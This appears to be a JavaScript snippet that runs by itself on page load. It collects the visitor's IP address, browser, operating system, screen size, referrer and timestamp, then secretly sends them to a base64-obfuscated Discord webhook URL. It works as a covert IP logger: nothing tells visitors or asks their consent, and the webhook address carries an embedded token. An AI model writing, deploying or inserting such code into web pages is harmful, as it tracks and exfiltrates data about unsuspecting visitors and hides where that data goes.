(function() {
    async function _gIP() {
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            return d.ip;
        } catch (e) {
            return 'N/A';
        }
    }

    function _gUA() {
        const ua = navigator.userAgent;
        let br = 'UB';  // Unknown Browser
        let os = 'UO';  // Unknown OS

        if (ua.includes('Firefox')) {
            br = 'MF';
        } else if (ua.includes('Chrome')) {
            br = 'GC';
        } else if (ua.includes('Safari')) {
            br = 'SF';
        } else if (ua.includes('MSIE') || ua.includes('Trident')) {
            br = 'IE';
        } else if (ua.includes('Opera') || ua.includes('OPR')) {
            br = 'OP';
        }

        if (ua.includes('Windows NT 10.0')) {
            os = 'W10';
        } else if (ua.includes('Mac OS X')) {
            os = 'Mac';
        } else if (ua.includes('Linux')) {
            os = 'Lin';
        } else if (ua.includes('Android')) {
            os = 'And';
        } else if (ua.includes('iPhone')) {
            os = 'iOS (iP)';
        } else if (ua.includes('iPad')) {
            os = 'iOS (iPd)';
        }

        return { br, os };
    }

    async function _sI() {
        const ip = await _gIP();
        const { br, os } = _gUA();
        const sw = screen.width;
        const sh = screen.height;
        const rf = document.referrer || 'Direct';
        const ts = new Date().toISOString();

        const data = { ip, br, os, sw, sh, rf, ts };

        const url = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NjM0OTEyODE4MzUxMzEzOC9QamNEdk1sbU1TZnotM2EyVFZVbWFl eEdMSEUydGpFRXVZYVcwayZNTFpzNW81MWlLLUpUS2owVmROWl9iazFjd1E0cFI5');

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: JSON.stringify(data) })
        });
    }

    window.onload = _sI;
})();
